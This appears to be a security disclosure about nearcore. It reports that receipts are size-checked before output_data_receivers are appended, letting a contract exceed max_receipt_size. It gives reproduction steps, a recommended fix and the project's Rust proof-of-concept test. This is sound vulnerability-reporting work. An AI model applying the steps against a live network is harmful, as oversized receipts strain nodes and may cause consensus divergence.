### Title
Receipt Size Limit Bypass via `promise_return` + `output_data_receivers` Mutation - (`runtime/runtime/src/lib.rs`)

### Summary

The `max_receipt_size` limit can be surpassed by an unprivileged user through a `promise_return` + `promise_then` DAG. A receipt is validated against the size limit before `output_data_receivers` from the parent receipt are appended to it, so the final on-chain receipt can exceed `max_receipt_size` without being rejected. This is the exact same class as the ICHI vault bug: a limit is checked against an incomplete/pre-mutation value, and a subsequent modification pushes the actual value past the limit.

### Finding Description

`validate_receipt` in `ValidateReceiptMode::NewReceipt` mode checks the Borsh-serialized size of a receipt against `limit_config.max_receipt_size` at the moment the receipt is first created by the contract: [1](#0-0) 

After this validation passes, the runtime's receipt-processing loop in `apply_action_receipt` checks whether the parent receipt has `output_data_receivers`. If the contract used `promise_return`, the runtime **mutates** the already-validated child receipt by appending those receivers to its `output_data_receivers` field: [2](#0-1) 

No re-validation of the receipt size is performed after this mutation. The receipt is then finalized with a new `receipt_id` and emitted as an outgoing receipt: [3](#0-2) 

The result is that a receipt whose Borsh size equals exactly `max_receipt_size` (4,194,304 bytes) before the append will exceed that limit after `output_data_receivers` are added, yet it is accepted, stored, and executed.

The codebase explicitly acknowledges this bug. The `ValidateReceiptMode::ExistingReceipt` variant was introduced specifically to tolerate these oversized receipts already in the chain: [4](#0-3) 

The test `test_max_receipt_size_promise_return` demonstrates the full exploit path and confirms the oversized receipt is accepted and executed (not rejected): [5](#0-4) 

### Impact Explanation

The `max_receipt_size` invariant is a protocol-level limit intended to bound the size of receipts stored in the state trie and transmitted between shards. Bypassing it means:

1. Receipts larger than `max_receipt_size` are written to the chain state (outgoing receipts, delayed receipts queue), corrupting the expected DB entry invariant.
2. These oversized receipts are transmitted across shards and must be handled by all nodes. Nodes that apply the `NewReceipt` validation path on incoming receipts may diverge from nodes that apply `ExistingReceipt` mode, creating a potential consensus divergence vector.
3. The `per_receipt_storage_proof_size_limit` (4,000,000 bytes) and `main_storage_proof_size_soft_limit` (4,000,000 bytes) for stateless validation witnesses are also implicitly undermined, since a single oversized receipt can push a witness past its soft limit. [1](#0-0) 

### Likelihood Explanation

Any unprivileged user who can deploy a contract can trigger this. The exploit requires:
1. Deploy a contract with a method that calls `promise_create` + `promise_then` (standard host functions).
2. Size the inner promise's args so the resulting receipt is exactly at `max_receipt_size` minus the base receipt overhead.
3. Call `promise_return` on the inner promise.

The parent receipt's `output_data_receivers` (added by `promise_then`) are then appended post-validation. This is a deterministic, reproducible path with no randomness or timing dependency. [6](#0-5) 

### Recommendation

After appending `output_data_receivers` to a returned receipt (the `promise_return` path), re-validate the receipt size before finalizing it. Specifically, after the mutation at `lib.rs` lines 1028–1035, call `validate_receipt` again with `ValidateReceiptMode::NewReceipt` and treat a size violation as an action error (similar to how `NewReceiptValidationError::ReceiptSizeExceeded` is already returned for directly oversized receipts).

### Proof of Concept

The existing test `test_max_receipt_size_promise_return` in `test-loop-tests/src/tests/max_receipt_size.rs` is the proof of concept. It:
1. Deploys a contract.
2. Calls `max_receipt_size_promise_return_method1`, which creates a DAG `[A -then-> B]` where A uses `promise_return` with a receipt sized exactly at `max_receipt_size`.
3. Confirms the transaction succeeds (no rejection).
4. Asserts via `assert_oversized_receipt_occurred` that a receipt above `max_receipt_size` is present in the chain. [5](#0-4)

    receipt: &Receipt,

    mode: ValidateReceiptMode,

                size: receipt_size,

// A function call will generate a new receipt. Size of this receipt will be equal to
// `max_receipt_size`, it'll pass validation, but then `output_data_receivers` will be modified and
// the receipt's size will go above max_receipt_size. The receipt should be rejected, but currently
// isn't because of a bug (See https://github.com/near/nearcore/issues/12606)
// Runtime shouldn't die when it encounters a receipt with size above `max_receipt_size`.
#[test]
fn test_max_receipt_size_promise_return() {
    init_test_logger();

    let account = create_account_id("account0");
    let account_signer = create_user_test_signer(&account);
    let mut env = TestLoopBuilder::new()
        .enable_rpc()
        .add_user_account(&account, Balance::from_near(10_000))
        .build();

    // Deploy the test contract
    let deploy_contract_tx = SignedTransaction::deploy_contract(
        101,
        &account,
        near_test_contracts::rs_contract().into(),
        &account_signer,
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(deploy_contract_tx, Duration::seconds(5));

    // User calls a contract method
    // Contract method creates a DAG with two promises: [A -then-> B]
    // When promise A is executed, it creates a third promise - `C` and does a `promise_return`.
    // The DAG changes to: [C ->then-> B]
    // The receipt for promise C is a maximum size receipt.
    // Adding the `output_data_receivers` to C's receipt makes it go over the size limit.
    let base_receipt_template = Receipt::V0(ReceiptV0 {
        predecessor_id: account.clone(),
        receiver_id: account.clone(),
        receipt_id: CryptoHash::default(),
        receipt: ReceiptEnum::Action(ActionReceipt {
            signer_id: account.clone(),
            signer_public_key: account_signer.public_key().into(),
            gas_price: Balance::ZERO,
            output_data_receivers: vec![],
            input_data_ids: vec![],
            actions: vec![Action::FunctionCall(Box::new(FunctionCallAction {
                method_name: "noop".into(),
                args: vec![],
                gas: Gas::ZERO,
                deposit: Balance::ZERO,
            }))],
        }),
    });
    let base_receipt_template = action_receipt_v1_to_latest(&base_receipt_template);
    let base_receipt_size = borsh::object_length(&base_receipt_template).unwrap();
    let max_receipt_size = 4_194_304;
    let args_size = max_receipt_size - base_receipt_size;

    // Call the contract
    let large_receipt_tx = SignedTransaction::call(
        102,
        account.clone(),
        account.clone(),
        &account_signer,
        Balance::ZERO,
        "max_receipt_size_promise_return_method1".into(),
        format!("{{\"args_size\": {}}}", args_size).into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(large_receipt_tx, Duration::seconds(5));

    // Make sure that the last promise in the DAG was called
    let assert_test_completed = SignedTransaction::call(
        103,
        account.clone(),
        account,
        &account_signer,
        Balance::ZERO,
        "assert_test_completed".into(),
        "".into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(assert_test_completed, Duration::seconds(5));

    assert_oversized_receipt_occurred(&env.validator());
}
